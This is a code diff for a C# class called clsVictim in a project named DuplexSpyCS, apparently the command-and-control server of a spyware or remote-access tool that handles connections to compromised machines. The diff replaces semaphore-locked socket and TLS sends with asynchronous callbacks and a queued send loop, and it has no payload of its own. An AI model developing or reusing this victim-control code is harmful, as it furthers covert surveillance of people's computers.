@@ -8,6 +8,8 @@ using System.Net.Sockets;
 using DuplexSpyCS;
 using System.Net.Security;
 using static DuplexSpyCS.clsHttpListener;
+using System.Xml.Linq;
+using System.Collections.Concurrent;
 
 public class clsVictim
 {
@@ -39,8 +41,8 @@ public class clsVictim
     public int SentBytes { get { return _sent_bytes; } }
 
     //Lock
-    private readonly SemaphoreSlim _tcpSemaphore = new SemaphoreSlim(1, 1);
-    private readonly SemaphoreSlim _sslSemaphore = new SemaphoreSlim(1, 1);
+    public BlockingCollection<byte[]> _tlsSendQueue = new BlockingCollection<byte[]>(new ConcurrentQueue<byte[]>());
+    private CancellationTokenSource _tlsCts { get; set; }
 
     //FOLDER
     public string dir_victim;
@@ -86,6 +88,18 @@ public class clsVictim
         r_addr = split[0];
         r_port = int.Parse(split[1]);
         ID = "[NOT YET]";
+
+        _tlsCts = new CancellationTokenSource();
+        fnTlsSendLoop(_tlsCts.Token);
+    }
+
+    ~clsVictim()
+    {
+        if (_tlsCts != null)
+        {
+            _tlsSendQueue.CompleteAdding();
+            _tlsCts.Cancel();
+        }
     }
 
     public void Send(int Command, int Param, string data)
@@ -100,25 +114,10 @@ public class clsVictim
             {
                 buffer = new clsDSP((byte)Command, (byte)Param, buffer).GetBytes();
 
-                await _tcpSemaphore.WaitAsync();
-
-                try
+                socket.BeginSend(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
                 {
-                    int nOffset = 0;
-                    while (nOffset < buffer.Length)
-                    {
-                        int nSent = await socket.SendAsync(new ArraySegment<byte>(buffer, nOffset, buffer.Length - nOffset), SocketFlags.None);
-                        nOffset += nSent;
-                    }
-                }
-                catch (Exception ex)
-                {
-                    clsStore.sql_conn.WriteErrorLogs(this, ex.Message);
-                }
-                finally
-                {
-                    _tcpSemaphore.Release();
-                }
+                    socket.EndSend(ar);
+                }), buffer);
 
                 clsStore.sent_bytes += buffer.Length;
             }
@@ -133,24 +132,18 @@ public class clsVictim
         if (abBuffer == null)
             return;
 
-        await _tcpSemaphore.WaitAsync();
-
         try
         {
-            int nOffset = 0;
-            while (nOffset < buffer.Length)
+            socket.BeginSend(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
             {
-                int nSent = await socket.SendAsync(new ArraySegment<byte>(buffer, nOffset, buffer.Length - nOffset), SocketFlags.None);
-                nOffset += nSent;
-            }
+                socket.EndSend(ar);
+            }), buffer);
+
+            clsStore.sent_bytes += buffer.Length;
         }
         catch (Exception ex)
         {
             clsStore.sql_conn.WriteErrorLogs(this, ex.Message);
-        }
-        finally
-        {
-            _tcpSemaphore.Release();
         }
     }
 
@@ -191,37 +184,46 @@ public class clsVictim
 
     public void fnSslSend(string szMsg) => fnSslSend(szMsg.Split('|'));
     public void fnSslSend(string[] asMsg) => fnSslSend(asMsg.ToList());
-    public async void fnSslSend(List<string> lsMsg)
-    {
-        string szMsg = string.Join("|", lsMsg);
-        byte[] abMsg = Encoding.UTF8.GetBytes(szMsg);
 
-        clsDSP dsp = new clsDSP(0, 0, abMsg);
+    public void fnSslSend(List<string> lsMsg) => fnSslSend(0, 0, string.Join("|", lsMsg));
+    public void fnSslSend(int nCmd, int nParam, string szMsg) => fnSslSend(nCmd, nParam, Encoding.UTF8.GetBytes(szMsg));
+    public void fnSslSend(int nCmd, int nParam, byte[] abMsg)
+    {
+        clsDSP dsp = new clsDSP((byte)nCmd, (byte)nParam, abMsg);
         byte[] abBuffer = dsp.GetBytes();
 
-        await fnSslSendRaw(abBuffer);
+        fnSslSendRaw(abBuffer);
     }
 
     /// <summary>
     /// Send SSL raw data.
     /// </summary>
     /// <param name="abBuffer"></param>
-    public async Task fnSslSendRaw(byte[] abBuffer)
+    public void fnSslSendRaw(byte[] abBuffer)
     {
-        await _sslSemaphore.WaitAsync();
-        try
+        _tlsSendQueue.Add(abBuffer);
+    }
+
+    public Task fnTlsSendLoop(CancellationToken ct)
+    {
+        return Task.Run(() =>
         {
-            await m_sslClnt.WriteAsync(abBuffer, 0, abBuffer.Length);
-            //await m_sslClnt.FlushAsync();
-        }
-        catch (Exception ex)
-        {
-            clsStore.sql_conn.WriteErrorLogs(this, ex.Message);
-        }
-        finally
-        {
-            _sslSemaphore.Release();
-        }
+            try
+            {
+                foreach (var data in _tlsSendQueue.GetConsumingEnumerable(ct))
+                {
+                    m_sslClnt.Write(data, 0, data.Length);
+                    m_sslClnt.Flush();
+                }
+            }
+            catch (OperationCanceledException)
+            {
+
+            }
+            catch (Exception ex)
+            {
+            }
+        }, ct);
     }
 
     public void fnHttpSend(string szMsg) => fnHttpSend(2, 0, szMsg);
